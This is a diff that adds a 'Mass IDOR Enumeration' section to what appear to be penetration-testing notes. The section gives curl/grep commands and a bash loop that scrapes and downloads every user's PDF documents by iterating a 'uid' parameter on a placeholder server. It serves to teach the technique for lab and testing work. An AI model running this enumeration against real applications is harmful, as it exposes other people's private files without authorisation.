@@ -67,3 +67,57 @@ Imagine a user can view their salary after making the following API call:
 ```
 
 with these details at hand, we can try repeating the same API call while logged in as `User2` to see if the web application returns anything.
+
+## Mass IDOR Enumeration
+
+Here are some informations parameters that are vulnerable&#x20;
+
+employee with user id `uid=1` -> can lead to data exposure and auth bypass:
+
+Let's imagine this person has a personal document folder ->
+
+```
+http://SERVER_IP:PORT/documents.php?uid=1
+```
+
+The files of this user are pretty simple patterns ->
+
+```html
+/documents/Invoice_1_09_2021.pdf
+/documents/Report_1_10_2021.pdf
+```
+
+With this pattern we can easily fuzz files for other users.
+
+We can inspect the page and look how the documents are coded:
+
+```html
+<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
+<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
+```
+
+We can pick any unique word to be able to `grep` the link of the file. In our case, we see that each link starts with `<li class='pure-tree_link'>`, so we may `curl` the page and `grep` for this line
+
+```shell-session
+curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
+```
+
+And we can curl out every files from every users with this technique and use a `Regex` pattern that matches strings between `/document` and `.pdf`, which we can use with `grep` to only get the document links->
+
+```shell-session
+curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+```
+
+And go evenu further and make a look that goes and fetch every file from every employee ->
+
+```bash
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+```
